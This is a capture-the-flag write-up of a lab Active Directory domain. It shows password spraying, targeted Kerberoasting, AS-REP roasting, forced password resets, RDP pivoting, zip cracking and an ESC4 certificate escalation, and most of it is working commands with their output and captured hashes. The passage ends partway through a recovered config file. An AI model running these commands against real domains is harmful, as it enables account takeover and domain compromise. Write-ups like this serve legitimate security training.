# Overview

This was a enjoyable box which started with a downloadable executable which leaked a DEBUG base64 string. When decoded returned a MD5 hash which when cracked leaked a password. After creating a username list from the `Meet Our Team` section of the home page i find the password works for the user `karl.hackermann`.

Once credentials were gained i carried out typical enumeration of the domain such as dumping username lists and preforming kerberoasts which returned nothing. After checking for writable objects i found karl had write access over the user `Tom.Reboot` so i carried out a targeted Kerberoasting attack and then cracked the password hash with hashcat.

After gaining access to tom, i decided it was a good time to run bloodhound which allowed me to see tom has `forcePasswordChange` against `robert.graef`. Robert then had multiple uses. He could add users to the `Remote Desktop Users` group. He could also change multiple users passwords such as `jan.tresor`. Finally he could modify some users `userAccountControl` meaning he could remove `DISABLEACCOUNT` from webadmin.

To abuse Roberts rights i first added himself too the `Remote Desktop Group` to have a look on the system. This revealed some user accounts that already had home folders, this included `jan.tresor` so i changed her password and logged in. 

After loggin in as jan i found multiple files in the recycle bin which guided me for the rest of the lab. 1 file revealed `daniel.hoffmann`'s password. 1 file stated that the web admin account had been disabled due to security reasons and only admin or `robert.graef` could re-enable it (good job we have Robert).  The other interesting file which didnt mean much at the time stated that their archive files should have strong passwords and to base them on the companys history.

Following on from this i checked for edges for daniel. This showed he could reset `webadmins` password. so i used robert to re-enable the account and then also add the account to the `remote desktop users` group. I then logged in as webadmin.

Initially as web admin i tried to upload a reverse .aspx shell into the web root but the user could not write there. i then found a file called `config_backup.zip` which initially i tried to crack with `zip2john` and `rockyou.txt`. But then i remembered the file from `jans` recycle bin which pointed me to the websites history tab. After finding the password on the website i cracked the file and this revealed credentials for the user `svc.services`

Some quick enumeration as `svc.services` revealed that they were in the `Certificate Services` group. Knowing this i used `certipy-ad` to enumerate for vulnerable templates. I then found a template called `Vuln-ESC4` which you guessed it, was a vulnerable ESC4 template. This allowed me to modify the template (Set it to default configuration) and then request a `.pfx` as administrator and eventually gain the administrators NTLM hash.


# Network Scan

```bash
$ nmap -sCV -p- -v -T4 $IP -oN nmap.out

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: 404 Finance Group
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-24 10:55:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T10:56:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-24T10:27:34
| Not valid after:  2027-10-24T10:27:34
| MD5:     ccf1 a837 76c4 f53e d692 9cb7 22b7 2049
| SHA-1:   f90a 6a17 51a5 0748 a563 f57b 1267 2bf2 dd97 dd31
|_SHA-256: 9ada fb05 d583 de84 5d93 be53 15f8 5aae 9f57 6835 91f3 6573 57f3 e695 3e7a e699
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-24T10:27:34
| Not valid after:  2027-10-24T10:27:34
| MD5:     ccf1 a837 76c4 f53e d692 9cb7 22b7 2049
| SHA-1:   f90a 6a17 51a5 0748 a563 f57b 1267 2bf2 dd97 dd31
|_SHA-256: 9ada fb05 d583 de84 5d93 be53 15f8 5aae 9f57 6835 91f3 6573 57f3 e695 3e7a e699
|_ssl-date: 2026-10-24T10:56:31+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T10:56:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-24T10:27:34
| Not valid after:  2027-10-24T10:27:34
| MD5:     ccf1 a837 76c4 f53e d692 9cb7 22b7 2049
| SHA-1:   f90a 6a17 51a5 0748 a563 f57b 1267 2bf2 dd97 dd31
|_SHA-256: 9ada fb05 d583 de84 5d93 be53 15f8 5aae 9f57 6835 91f3 6573 57f3 e695 3e7a e699
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-24T10:56:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-24T10:27:34
| Not valid after:  2027-10-24T10:27:34
| MD5:     ccf1 a837 76c4 f53e d692 9cb7 22b7 2049
| SHA-1:   f90a 6a17 51a5 0748 a563 f57b 1267 2bf2 dd97 dd31
|_SHA-256: 9ada fb05 d583 de84 5d93 be53 15f8 5aae 9f57 6835 91f3 6573 57f3 e695 3e7a e699
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FINANCE404
|   NetBIOS_Domain_Name: FINANCE404
|   NetBIOS_Computer_Name: DC-404
|   DNS_Domain_Name: 404finance.local
|   DNS_Computer_Name: DC-404.404finance.local
|   DNS_Tree_Name: 404finance.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-24T10:55:52+00:00
|_ssl-date: 2026-10-24T10:56:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Issuer: commonName=DC-404.404finance.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-23T10:36:40
| Not valid after:  2027-04-24T10:36:40
| MD5:     739c 6d92 5db2 5d31 732b 764e f9ab 767f
| SHA-1:   1f64 03e2 57f2 cc83 67e6 cb8b 5f06 9f96 31c0 9d25
|_SHA-256: 49d2 0a59 57a1 adfc a563 a97d 3b49 acf3 0234 1d83 7921 4bac 61a9 1049 094a c7d2
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

# Unauthenticated enumeration:

I begin with standard SMB and LDAP enumeration but null auth on both is disabled. So i move on to web enumeration.

On the webpage i find a download for `CorpBankDialer.exe` at the `/services.htlm` endpoint which states its used for online banking.

<img width="1369" height="291" alt="image" src="https://github.com/user-attachments/assets/41ed52f8-2de6-4e4a-92b1-e86014039365" />

I also find some potential users

<img width="1363" height="814" alt="image" src="https://github.com/user-attachments/assets/337dc66d-7244-4df5-a66d-58462b71cdf9" />

```
alex Meier
Robert Graef
Karl Hackermann
```

I will make a username list from this using `unername-anarchy`

```bash
$ ~/tools/windows/username-anarchy/username-anarchy --input-file names.txt > users.txt
```

I start with running `file` against it to find it is a ELF Linux executable 

```bash
$ file CorpBankDialer.exe                
CorpBankDialer.exe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4016558a88d1d6978edffb8865f21313d3e9719d, for GNU/Linux 3.2.0, not stripped
```

I make the program executable and run it.

```bash
$ ./CorpBankDialer.exe 
Welcome to CorpBank SecureAccess v3.7.2\nDEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n
```

I decode the Base64 debug string which seems to give a MD5 hash.

```bash
$ echo 'ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=' | base64 -d                       
dd2ef34530de7e5bef22a05e7e5dd178
```

I then crack this with hashcat.

```bash
$ echo 'dd2ef34530de7e5bef22a05e7e5dd178' > unk.hash

$ hashcat -m 900 unk.hash /usr/share/wordlists/rockyou.txt
Password123!!
```

I then spray the password against the username list i made.

```bash
$ nxc smb 10.1.128.126 -u users.txt -p 'Password123!!'      
SMB         10.1.128.126    445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                       
SMB         10.1.128.126    445    DC-404           [-] 404finance.local\a.meier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.128.126    445    DC-404           [-] 404finance.local\r.graef:Password123!! STATUS_LOGON_FAILURE 

/...SNIP.../

STATUS_LOGON_FAILURE 
SMB         10.1.128.126    445    DC-404           [-] 404finance.local\robert.graef:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.128.126    445    DC-404           [+] 404finance.local\karl.hackermann:Password123!!
```

I find that the password works for `karl.hackermann`

# Enumeration a karl.hackermann

First i update my user list with `nxc --users-export`

```bash
$ nxc smb 10.1.128.126 -u karl.hackermann -p 'Password123!!' --users-export users.txt
SMB         10.1.128.126    445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.128.126    445    DC-404           [+] 404finance.local\karl.hackermann:Password123!! 
SMB         10.1.128.126    445    DC-404           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.1.128.126    445    DC-404           Administrator                 2025-07-05 10:56:50 0       Built-in account for administering the computer/domain 
SMB         10.1.128.126    445    DC-404           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.1.128.126    445    DC-404           krbtgt                        2025-07-01 17:45:08 0       Key Distribution Center Service Account 
SMB         10.1.128.126    445    DC-404           karl.hackermann               2025-07-02 14:05:22 0        
SMB         10.1.128.126    445    DC-404           tom.reboot                    2025-07-02 18:07:16 0        
SMB         10.1.128.126    445    DC-404           robert.graef                  2025-07-01 18:54:20 1        
SMB         10.1.128.126    445    DC-404           nina.inkasso                  2025-07-01 18:47:36 0        
SMB         10.1.128.126    445    DC-404           jan.tresor                    2025-07-01 18:47:49 0        
SMB         10.1.128.126    445    DC-404           melanie.kunz                  2025-07-01 18:29:19 0        
SMB         10.1.128.126    445    DC-404           daniel.hoffmann               2025-07-01 18:48:06 0        
SMB         10.1.128.126    445    DC-404           webadmin                      2025-07-01 18:46:44 0        
SMB         10.1.128.126    445    DC-404           svc.services                  2025-07-02 18:31:11 0       Service account for requesting certificates and performing automated tasks within the domain 
SMB         10.1.128.126    445    DC-404           [*] Enumerated 12 local users: FINANCE404
SMB         10.1.128.126    445    DC-404           [*] Writing 12 local users to users.txt
```

I then perform AS-REP and Kerberoasting with no luck.

```bash
$ impacket-GetUserSPNs 404finance.local/'karl.hackermann':'Password123!!' -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$404FINANCE.LOCAL$*krbtgt*$44624f601d87ff5da7a5e451$0972d24d13c54277c388395fff3693d6243da38df808e52d5bdd93dc89f7a115e2969fccccaccb6e0c143dfa21b11adc88f540258f55f98482a757671c0306185545458fdd7fb6c465b066004e9106b72751bb53410441b6d43fd1d331d59d015ade5598538bf004960779b2b877149de66a28949249bad180355744431f3fe6b748bf9e065b6f7ed00709b686981025464d2fa721f3def5e1c0da6ee5e91c2db591e060a15aa9bac4b2b19740698844d29c22b19a801ca935611ea217fff31dbe3acb3e9d057bff4b5a0131fb8cb5a723a933156df68eab579926db23e62d0c028b256c2794a04eea861b86177a2781a3ff28726f829b2def6df24b66583047da05e6d4b4b93821ae0590b6ddd9d62db634604ece34177d5cf7f2d9e0470749842e3669648b8352808a35f711db0ab3c4e7b86dd1dc4b300cdb910b1293974c92e8439cff7057d246ae073f31d6e04bb8333e71175d8584ecff4bdc04dd0860b08b141f14ac1ef69b4d574dcf97cbe1ff954b0b9baaa5273c8ff3711aa488686102d50cac696a4d9daed4b6a89a453fcc55124812ac6639c6cd68b79e22761c4773406465f7adf407a39fc34500f4e3919c81b732e54571c8691f699eb0c58f00b8ea0df616bc1493a2e7caa5b37903ba6d94e3370a779698670e269a84e2815f4cd7c8f83e0adc153350b24c9126164f9f331a530cf9ec4749d22fdd698762a868ab242d424c51f0d06b271dc66696e8c1938260f36d39c21d5272827fcfe03773b3cd1e8780510f41be8dde56f24b4cbb6619b60c336e168a6bab662d6f9c8afe90c832b01ee329b5412067df5554f9339e9bdc321f00a292ab78ae591dd5303f8d3fe3de41317ee83d2b3d56c78b06c8dffcf820f7e08d0a075538f5db88fc0da558172262b9975418586038591b15d472bf0b974d6bc4729d7a38b9fce510cdb42f330179786c74c2f8236ba3ce63648ba0c2a0039e16c504d0aa75fb8908872d5c63408cbfa478702f13bdc80dd9dbc3b8933e609a921ba44647c65d8316a6cfa3923698d3dd7b2d82ca06bf46d33b573f5bf9fd006fbfff08ecd897a3c3a00b057d9c6c92bdf2111e7f99408dbf7adfc48690485360f9baa16a3e50359ad807d84c09c8d65606458cf136f9e01b2c657e743fee760d5fd77fc5a4cd0a37eaed1a16383c8f37540b4b88c115e557300f9f9e3c05d3ab44c6575b59d7ac8f108bc15a254dfba243e298cd051ebd277d3c5b414ad255d2036cd4a8e07a3af1cb53da97a5195db1d9339b88e9d304b705fc1558c2b694507e57a6424eca4fe76c572e6cb3b01fd1ff565b913fce48e9599075e75366ace20995e8d49516b495773d2c666338ab82831deca013e89156c4ffc702d9bad0ac2edee9b23bfd6f0e14a5197cbff27a404d31c3bfd6d94745f82c8ba2054842ca5ac16f9efea703660b3bcd5c70a6edb19b4536000b480a156a00e631ffcd803d19a89463a481c490e4fe7250afdd60032939e89a9abbb4cd1d81bb0279a3872640c899119ab99126c480ef34c3467cfded7f7fa6e5cea874dd6937b015a720c74ef4940f0a0b7b07bb3ebbdc73a194
[-] Principal: karl.hackermann - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tom.reboot - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: robert.graef - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nina.inkasso - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jan.tresor - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: melanie.kunz - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: daniel.hoffmann - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: webadmin - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: svc.services - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

```bash
$ impacket-GetNPUsers 404finance.local/'karl.hackermann':'Password123!!' -usersfile users.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User karl.hackermann doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tom.reboot doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robert.graef doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nina.inkasso doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jan.tresor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User melanie.kunz doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User daniel.hoffmann doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User webadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Next il check for writable objects with `bloodyad`

```bash
$ bloodyad -d 404finance.local --host 10.1.128.126 -u karl.hackermann -p 'Password123!!' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=404finance,DC=local
permission: WRITE
distinguishedName: CN=Karl Hackermann,CN=Users,DC=404finance,DC=local
permission: WRITE
distinguishedName: CN=Tom Reboot,CN=Users,DC=404finance,DC=local
permission: WRITE
distinguishedName: DC=404finance.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=404finance,DC=local
permission: CREATE_CHILD
distinguishedName: DC=_msdcs.404finance.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=404finance,DC=local
permission: CREATE_CHILD
```

seems we have WRITE access over `tom.reboot` so i will target this user for kerberoasting.

```bash
$ python3 ~/tools/windows/targetedKerberoast.py --dc-ip 10.1.128.126 -d 404finance.local -u karl.hackermann -p 'Password123!!' --request-user tom.reboot 
[*] Starting kerberoast attacks
[*] Attacking user (tom.reboot)
[+] Printing hash for (tom.reboot)
$krb5tgs$23$*tom.reboot$404FINANCE.LOCAL$404finance.local/tom.reboot*$4d9d8c039eb088cc9f0e3c0576db8533$0229de0bcba0282e2716a107e3ab693e9dbfddf66a09596220414ce522e3f1c709e74f4f3705991a4a572bbdbe98e4f8315849682484669aac4e8d62d7440bdcd2704b29c9ebaca1d5afb6c863e0e638bd66b60645c7f21b4c4cbc3b868067b96c2e56f0e0fb983975187aa170687561fd37c9e54fef401eabc658deeb5a3eae371efa1236ea5a4c7757d11b76d48574e26b40499f8a8dc7e7884cca6cc6390c38bf633efeede82f48ca45a596d5df96da2421efb9cbd3b7d50fe069520b9ba7944b4dcd7f665c7e67ebeb84aca1432eb00600379dcc6e82b6a53b9a8bf57f27498e002928f7e950e69543c429a4de9e7df519a1299cafb1301e878942084cc17a8ea29b1c13acee70632bc055997295fb4b70fe862fb4aa5d41b9f5cf2be9e1822681477dca80aa6e7203e0d0fd5762aea25ece7f92b4666c0d4480ce7987ab0355c215ddfd2876f9cbad8c4a417dce03cb4b2096da8833d31aa7018bc638e38f3047f1a2bf7da622993c7116f43da658c6051d3700a0304f8c374580b2604703ff4c753bd2ffd6584bd15bb8ee384cf0466c4dcc1b880288eda89cd7de113097a5a07a21d946e418be84f41d83a76324c1ac6ed9fd4fdbceab9cf721d782c49976b74ed46213f72c5a81ccbe0441a696e83f075300179335a23d870f013642dc8a695f908b877e4c210635c83187f0116c4db04d935238fe48019e95a25126b66460b295d20111c36d5c610b29e77b712ce560368243011fdd84ee34be557a5d7d0d4a4e17e84e51d2b8fea0f9e21f58c7d6decf79a9355b599d6da5193760ec202ab679760ef23d12e0084564af46897b02b782342b2d9090e92c4de0882b6f3ec258a5fa21872d9f30d05f25207506dfb38a54c70e694bc83ac157f7603d2a5246c9bf559362744490536f9acfbcfdd9dc911776425e68cd34e6149974bd5f5283a9ad84970a2b804c4332c638e589e7c08d8915e2e3b2f01396c0cb4aee703057e75144ec4f4190c8e2edb17039166b27cbecce0073725df5a664c0c60645b7705c4a3a24626aa059a55780f3e236d4bdc1100178d269d8d5036fed520e7b6422f4a1973e63f08871f26e1a0789463adee807cee6b8c196209d175899bcd264d23f5ffdc0ff42a9cd1b9191f2d31f2800f860cd7cbf286e542a6f5e9ff82198296c1778a0d179247971d4f4ae9cc53ff07fd20c9f441e79b0297a820226cd8fb969606d9e3353a2113829ba72c4b2dfe216e23f9f9aaea3e914e9d1d20cf5d4ee854329a5ba49682db318b1c7f7e3d0724ec59c40353cbd79ff8a5aa617153b084071f20752ab4ff77f4508caa9ee5fcb9214f6057c4734350406ed49f40e6beaf589d8fea7188740e3fba1fa7fea1c63e6b3c78d280e72778f918be210c8a4d42191c9387fb43c36fda637fbb8d8b5394e29d05d904ac57f30d40458e8664394c44d7a2c345342280eccaf5101933e3cf03df1a2f0fcb7f6cfe2a1f07ae74a2abc46661edfce3c26955eb20a379970902bfb42ef329af4cdfc58795c9839110923e06be5d15e7467d88f59f96b80ed61463f3ae4181fc1ca5b823f6ff1
```

```bash
$ hashcat -m 13100 tom.hash /usr/share/wordlists/rockyou.txt
P@ssw0rd123
```

# Enumeration as Tom.reboot

First i run bloodhound as this user.

```bash
$ bloodhound-python -d 404finance.local -ns 10.1.128.126 -u tom.reboot -p 'P@ssw0rd123' -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: 404finance.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc-404.404finance.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc-404.404finance.local
INFO: Found 13 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC-404.404finance.local
INFO: Done in 00M 21S
```

After checking toms edges i find i can reset `robert.graef`'s password.

```bash
$ bloodyad -d 404finance.local --host 10.1.128.126 -u tom.reboot -p 'P@ssw0rd123' set password robert.graef 'NewPass!23'
[+] Password changed successfully!
```

# Enumeration as robert.graef

Looking at bloodhound robert has edges over multiple users. See below

<img width="1305" height="874" alt="image" src="https://github.com/user-attachments/assets/c65b8714-0d56-4a19-89ab-be9f2145a0ec" />


First we can add ourself the to the `Remote Desktop Users` group and be able to RDP in which is what i do and find 3 other users which have home folder. These users being `jan.tresor`, `svc.services`, `daniel.hoffman`

```powershell
PS C:\Users> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/5/2026   8:08 AM                Administrator
d-----         7/2/2025  11:14 AM                daniel.hoffmann
d-----         7/2/2025   9:09 AM                jan.tresor
d-r---         7/1/2025  10:30 AM                Public
d-----       10/24/2026   7:01 AM                robert.graef
d-----         7/3/2025   6:47 AM                svc.services
```

# Abusing WriteAccountRestrictions

Having `WriteAccountRestrictions` over a user object allows you to modify the users UAC `userAccountControl`. Therefore allowing me to set the `DONT_REQ_PREAUTH` to each user and then grab hashes for them via `AS-REP` roasting. To add this i will use BloodyAD

```bash
$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' add uac daniel.hoffmann -f DONT_REQ_PREAUTH
[+] ['DONT_REQ_PREAUTH'] property flags added to daniel.hoffmanns userAccountControl

$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' add uac svc.services -f DONT_REQ_PREAUTH
[+] ['DONT_REQ_PREAUTH'] property flags added to svc.servicess userAccountControl

$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' add uac jan.tresor -f DONT_REQ_PREAUTH
[+] ['DONT_REQ_PREAUTH'] property flags added to jan.tresors userAccountControl
```

Now i perform a new AS-REP roast.

```bash
$ impacket-GetNPUsers 404finance.local/'karl.hackermann':'Password123!!' -usersfile users.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User karl.hackermann doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tom.reboot doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robert.graef doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nina.inkasso doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jan.tresor@404FINANCE.LOCAL:109d424c750df132a0dc7bc076fcaaeb$887eb70fb4985506c9f0ad590b1cd9fac46c6748393d7e1b5cb5bad8216e0f92eb8802caf7001b5c797a2f615a1d97bdecf473b4b91f007ea8b931d47c39cc38d8774e507670108904dff512320eec11574562ec24d642a77883269d1cf7fcbac66f79ea76c4f72fc4669949367d02cb8520eb2d234fda08bc9596fcbef9ae0fa54ba5b35310a889e12bf718d1bc8f0bdd6ddc7662b503b5cef88fa09e9959c63b3f98238c305538e66415be9e3bf5a3e16035f4370a7314adeef61da73150e4d3fd1b74e3886b8ac67c8ed8503ae80cad7b7218c011a6677cc4518bbf254a5765268b3921506c4c35dbc0e05bba82c8194c9041
[-] User melanie.kunz doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$daniel.hoffmann@404FINANCE.LOCAL:6e591186be3c97961b45c6c5741a5539$ccea420e3b9104bd531640b026ede657fe0c6017bf2b484577648553335137d098a1f2e04a94ceb3d52c04959133e278aa57eff87a15d65383a4874bcec23351b36111a66b6c09feced3d485378499de7539e71fb2163a3410ea27523b2995c0dcfa4cf196e81cbe4dddbda24ffcf0464351f114b77d4bd720fda092799b4402d83a637df8f516e42de6de15e830a662764c5c9d54acab6d8af6ec66b4fb2d87ea907c3c522339be8930cc2a6cc41a420273dd5e3d2811434ac897f2816c5163b6013519829f79eb74f52a518a9a6a73a679975add1d507471973814403a03f5f77bb27e25a33bc068829fd570fcfedb0ce5b544
[-] User webadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Unfortunately none of these hashes cracked. However taking a closer look at bloodhound i see double edges over the users jan, nina, melanie. This edge was force password change.

I will start with `jan` due to the fact she has a home folder. i change her password and then add her to the `Remote Desktop Users` group.

```
$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' set password jan.tresor 'NewPass!23'        
[+] Password changed successfully!

$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' add groupMember "Remote Desktop Users" jan.tresor 
[+] jan.tresor added to Remote Desktop Users
```

# Enumeration as Jan

First i RDP in as jan

```bash
$ xfreerdp /v:10.1.128.126 /u:jan.tresor /p:'NewPass!23'
```

When i log in i find 4 `.eml` files in the recycle bin revealing `daniel.hoffmann`'s password

<img width="1381" height="730" alt="image" src="https://github.com/user-attachments/assets/214c5226-66fd-4bce-8f51-d6a957ce2566" />


I also find i may need to reactive the user `svc.services` using Roberts account which do with the following command.

```bash
$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' remove uac svc.services -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from svc.services's userAccountControl
```

next i will test Daniel's credentials.

```bash
nxc smb 10.1.128.126 -u daniel.hoffmann -p 'RemoteAccess!2024'
SMB         10.1.128.126    445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.128.126    445    DC-404           [+] 404finance.local\daniel.hoffmann:RemoteAccess!2024
```

# Enumeration as Daniel

Checking bloodhound this user is part of the `Remote Management Users` group meaning i can WinRM as him i can also `ForcePasswordChange` to the `WebAdmin` account meaning i may be able to put a shell in the web root.

```bash
$ bloodyad --host 10.1.128.126 -d 404finance.local -u daniel.hoffmann -p 'RemoteAccess!2024' set password webadmin 'NewPass!23'
[+] Password changed successfully!
```

I then use Roberts rights to add the user to the Remote Desktop group.

```bash
$ bloodyad -d 404finance.local --host 10.1.128.126 -u robert.graef -p 'NewPass!23' add groupMember "Remote Desktop Users" webadmin   
[+] webadmin added to Remote Desktop Users
```

I then remote in and have a dig around. 

I attempted to upload a shell to the Port80 folder in the `wwwroot` folder but got access denied. this lead me to look into the port 5000 folder which revealed a file called `config_backup.zip` which i used a smbserver to transfer back to my remote host.

```bash
$ impacket-smbserver share $(pwd) -smb2support -user baz -password baz
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
```


```powershell
PS C:\inetpub\wwwroot\port5000> net use \\10.200.111.130\share /user:baz baz
The command completed successfully.

PS C:\inetpub\wwwroot\port5000> copy .\config_backup.zip \\10.200.111.130\share
```

I then inspect locally.

i attempted to unzip with `unzip` but hit an error 

``` bash
$ unzip config_backup.zip           
Archive:  config_backup.zip
   skipping: config.dat              unsupported compression method 99 
```

I then remeber seeing a file in `jans` recycle bit about archive passwords being secure etc so i take a look again and it states the passwords for archives will be based on the the company's history. I also remember there being a history page for the website which i take a deeper look into.

<img width="1362" height="198" alt="image" src="https://github.com/user-attachments/assets/8dd576c4-50fa-4372-b2c9-0de55d3d6ec5" />


I attempt the unzipping with the password `DontmessWithTexas` and was successful. The zipped file contained `config.dat` which revealed credentials for `svc.services`

```bash
$ cat config.dat
# Configuration Backup - Do not delete!
[ServiceUser]
username = svc.services
